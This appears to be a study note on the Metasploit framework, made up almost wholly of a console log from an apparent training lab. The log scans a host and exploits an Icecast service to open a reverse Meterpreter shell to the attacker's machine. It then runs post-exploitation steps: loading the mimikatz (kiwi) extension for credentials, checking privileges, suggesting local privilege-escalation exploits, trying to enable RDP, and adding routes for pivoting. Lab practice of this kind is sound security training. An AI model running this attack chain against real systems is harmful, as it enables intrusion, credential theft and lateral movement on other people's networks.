# Metasploit

**Metasploit** is one of the most famous pentesting tool.

It's an open source framework (maintained by **Rapid7**) which directly interact with the **exploitDB**. 

It contains exploits, post-exploitation tools and also auxiliary modules. 


```bash
msfdb init
msfconsole
msf6 > db_status
msf6 > db_nmap -sV 10.10.229.85 
msf6 > hosts
msf6 > services
msf6 > vulns
msf6 > use icecast
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

[*] Using exploit/windows/http/icecast_header
msf6 exploit(windows/http/icecast_header) > search multi/handler

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5  exploit/multi/handler                                                 manual     No     Generic Payload Handler
   6  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
   8  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence


Interact with a module by name or index. For example info 8, use 8 or use exploit/linux/local/yum_package_manager_persistence

msf6 exploit(windows/http/icecast_header) > use 5
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 > use icecast
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

[*] Using exploit/windows/http/icecast_header
msf6 exploit(windows/http/icecast_header) > set RHOSTS 10.10.229.85
RHOSTS => 10.10.229.85
msf6 exploit(windows/http/icecast_header) > set LHOST 10.11.35.147
LHOST => 10.11.35.147
msf6 exploit(windows/http/icecast_header) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.11.35.147:4444 
msf6 exploit(windows/http/icecast_header) > [*] Sending stage (175174 bytes) to 10.10.229.85
[*] Meterpreter session 1 opened (10.11.35.147:4444 -> 10.10.229.85:49205) at 2021-06-05 11:47:01 +0200

msf6 exploit(windows/http/icecast_header) > jobs

Jobs
====

No active jobs.

msf6 exploit(windows/http/icecast_header) > sessions

Active sessions
===============

  Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.11.35.147:4444 -> 10.10.229.85:49205 (10.10.229.85)
msf6 exploit(windows/http/icecast_header) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > ps

Process List
============

 PID   PPID  Name                    Arch  Session  User          Path
 ---   ----  ----                    ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 416   4     smss.exe
 488   692   vds.exe
 516   692   svchost.exe
 544   536   csrss.exe
 584   692   svchost.exe
 592   536   wininit.exe
 604   584   csrss.exe
 652   584   winlogon.exe
 692   592   services.exe
 700   592   lsass.exe
 708   592   lsm.exe
 816   692   svchost.exe
 884   692   svchost.exe
 932   692   svchost.exe
 1020  692   svchost.exe
 1056  692   svchost.exe
 1136  692   svchost.exe
 1308  1020  dwm.exe                 x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1324  1300  explorer.exe            x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1360  692   spoolsv.exe
 1388  692   svchost.exe
 1428  692   taskhost.exe            x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1472  2572  SearchFilterHost.exe
 1560  816   WmiPrvSE.exe
 1564  692   amazon-ssm-agent.exe
 1644  692   LiteAgent.exe
 1680  692   svchost.exe
 1776  692   svchost.exe
 1824  692   Ec2Config.exe
 2076  544   conhost.exe
 2256  2572  SearchProtocolHost.exe
 2264  1324  Icecast2.exe            x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2572  692   SearchIndexer.exe
 2740  1020  Defrag.exe
 2764  692   TrustedInstaller.exe
 2804  816   rundll32.exe            x64   1        Dark-PC\Dark  C:\Windows\System32\rundll32.exe
 2848  2804  dinotify.exe            x64   1        Dark-PC\Dark  C:\Windows\System32\dinotify.exe
 3012  692   sppsvc.exe
meterpreter > getuid
Server username: Dark-PC\Dark
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege
SeShutdownPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
meterpreter > run post/windows/gather/checkvm

[*] Checking if the target is a Virtual Machine ...
[+] This is a Xen Virtual Machine
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.229.85 - Collecting local exploits for x86/windows...
[*] 10.10.229.85 - 38 exploit checks are being tried...
[+] 10.10.229.85 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.229.85 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.229.85 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.229.85 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.229.85 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.229.85 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.229.85 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.229.85 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.229.85 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[+] 10.10.229.85 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
meterpreter > run post/windows/manage/enable_rdp
                                                                                                                                                             
[-] Insufficient privileges, Remote Desktop Service was not modified                                                                                         
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20210605120506_default_10.10.229.85_host.windows.cle_297688.txt
meterpreter > run autoroute -h

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[-] Could not execute autoroute: ArgumentError wrong number of arguments (given 2, expected 0..1)
meterpreter > run autoroute -a 172.18.1.0 -n 255.255.255.0 #deprecated
meterpreter > run post/multi/manage/autoroute SUBNET=172.18.1.0 ACTION=ADD

[!] SESSION may not be compatible with this module (incompatible session platform: windows)
[*] Running module against DARK-PC
[*] Adding a route to 172.18.1.0/255.255.255.0...
[+] Route added to subnet 172.18.1.0/255.255.255.0.
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(windows/http/icecast_header) > search server/socks5
[-] No results from search
msf6 exploit(windows/http/icecast_header) > search server/socks5
[-] No results from search
msf6 exploit(windows/http/icecast_header) > search socks5
[-] No results from search
msf6 exploit(windows/http/icecast_header) > search socks

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  auxiliary/server/socks_proxy                              normal  No     SOCKS Proxy Server
   1  auxiliary/server/socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection
   2  auxiliary/scanner/http/sockso_traversal  2012-03-14       normal  No     Sockso Music Host Server 1.5 Directory Traversal


Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/http/sockso_traversal
```
